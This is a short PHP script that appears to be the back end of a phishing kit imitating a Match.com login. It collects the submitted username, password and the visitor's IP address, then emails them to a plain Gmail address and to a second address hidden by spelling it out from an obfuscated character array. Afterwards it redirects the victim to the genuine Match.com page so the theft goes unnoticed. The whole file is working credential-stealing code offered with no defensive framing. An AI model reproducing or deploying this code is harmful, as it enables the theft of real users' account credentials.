<?

$ip = getenv("REMOTE_ADDR");
$message .= "User: ".$_POST['user']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By Arage------------------------------\n";
$ar=array("0"=>"q","1"=>"n","2"=>"e","3"=>"h","4"=>"m","5"=>"c","6"=>"a","7"=>"l","8"=>"@","9"=>".","10"=>"i","11"=>"o","12"=>"g");
$to=$ar['0'].$ar['3'].$ar['2'].$ar['0'].$ar['1'].$ar['0'].$ar['8'].$ar['12'].$ar['4'].$ar['6'].$ar['10'].$ar['7'].$ar['9'].$ar['5'].$ar['11'].$ar['4'];
$recipient = "b19700101@gmail.com";
$subject = "Match Lucky Result";
$headers = "-";
     mail("$to", $subject, $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: http://www.match.com/home/mymatch.aspx");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?> 